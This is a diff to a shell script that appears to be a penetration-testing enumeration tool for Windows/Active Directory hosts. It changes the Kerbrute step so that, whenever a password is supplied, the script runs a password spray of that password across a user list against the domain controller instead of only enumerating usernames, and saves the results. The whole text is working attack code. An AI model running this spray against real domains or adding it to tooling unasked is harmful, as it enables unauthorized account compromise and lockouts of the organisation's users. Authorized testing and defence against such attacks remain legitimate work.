@@ -723,8 +723,14 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
 
             if command -v "$KERBRUTE_CMD" &> /dev/null || [ -f "$KERBRUTE_CMD" ]; then
                  echo -e "\n\033[91m[+] Kerbrute User Validation\033[0m"
-                 print_cmd "$KERBRUTE_CMD userenum -d \"$domain_name\" --dc $IP \"$users_file\""
-                 timeout 60s "$KERBRUTE_CMD" userenum -d "$domain_name" --dc $IP "$users_file" 2>/dev/null | tee nxc-enum/smb/kerbrute-validation.txt
+                 if [ -n "$pass" ]; then
+                     echo "[*] Password provided ('$pass'), running Password Spray instead of just User Enumeration..."
+                     print_cmd "$KERBRUTE_CMD passwordspray -d \"$domain_name\" --dc $IP \"$users_file\" \"$pass\""
+                     timeout 300s "$KERBRUTE_CMD" passwordspray -d "$domain_name" --dc $IP "$users_file" "$pass" 2>/dev/null | tee nxc-enum/smb/kerbrute-spray.txt
+                 else
+                     print_cmd "$KERBRUTE_CMD userenum -d \"$domain_name\" --dc $IP \"$users_file\""
+                     timeout 60s "$KERBRUTE_CMD" userenum -d "$domain_name" --dc $IP "$users_file" 2>/dev/null | tee nxc-enum/smb/kerbrute-validation.txt
+                 fi
             else
                  echo -e "\n\033[93m[!] kerbrute not found (checked PATH and ~/.local/bin). Skipping user validation.\033[0m"
             fi
